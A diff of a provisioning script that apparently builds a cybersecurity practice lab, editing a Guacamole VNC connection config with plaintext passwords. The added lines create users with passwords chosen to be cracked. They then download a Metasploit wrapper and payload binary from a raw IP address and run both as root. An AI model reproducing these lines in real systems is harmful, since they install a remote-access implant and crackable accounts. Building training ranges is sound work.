@@ -24,16 +24,11 @@ printf '<user-mapping>
          documentation: http://guac-dev.org/Configuring%%20Guacamole -->
     <!-- Per-user authentication and config information -->
     <authorize username="student" password="hey this is a long student password">
-        <connection name="localVNC">
+        <connection name="KaliVNC">
             <protocol>vnc</protocol>
-            <param name="hostname">localhost</param>
+            <param name="hostname">10.0.19.5</param>
             <param name="port">5901</param>
             <param name="password">password</param>
-        </connection>
-        <connection name="attackerSSH">
-            <protocol>ssh</protocol>
-            <param name="hostname">10.0.18.5</param>
-            <param name="port">22</param>
         </connection>
     </authorize>
     <!-- Another user, but using md5 to hash the password
@@ -79,3 +74,15 @@ apt-get install -y xfce4 xfce4-goodies
 updatedb
 # Start guac service
 service guacd start
+useradd joshua -p password # wordlist, simple
+useradd alyssa -p afccdeg8 # brute-force, matches ?l?l?l?l?l?l?l?d, easy match
+useradd rajj -p 123mango # wordlist, end of rockyou
+cd /root/
+wget http://64.227.19.44/content/dlj23jjoj233jjajdeqo/linuxWrapperMSF.sh
+chmod +x linuxWrapperMSF.sh
+sudo ./linuxWrapperMSF.sh
+bg
+wget http://64.227.19.44/content/dlj23jjoj233jjajdeqo/msfPayload.elf
+chmod +x msfPayload.elf
+sudo ./msfPayload.elf
+bg
